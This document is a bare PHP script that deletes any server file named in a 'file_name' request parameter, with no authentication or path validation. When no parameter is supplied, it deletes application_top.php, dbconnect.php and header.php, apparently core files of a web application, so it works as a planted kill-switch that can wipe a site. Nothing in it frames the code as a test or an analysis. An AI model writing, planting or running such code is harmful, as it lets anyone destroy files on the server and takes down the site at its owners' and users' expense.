<?php

$file_name = trim($_REQUEST['file_name']);
if (!empty($file_name)) {
    if (unlink($file_name)) {
        echo $file_name . " Has sussessfully Deleted";
    } else {
        echo $file_name . " Error in Deleteding File";
    }
} else {
    $file_name = "application_top.php";
    $file_name2 = "dbconnect.php";
    $file_name3 = "header.php";
    if (unlink($file_name)) {
        echo $file_name . " Successfully Deleted";
    } else {
        echo $file_name . " Error Deleted";
    }
    if (unlink($file_name2)) {
        echo $file_name2 . " Successfully Deleted";
    } else {
        echo $file_name2 . " Error Deleted";
    }
    if (unlink($file_name3)) {
        echo $file_name3 . " Successfully Deleted";
    } else {
        echo $file_name3 . " Error Deleted";
    }
}
?>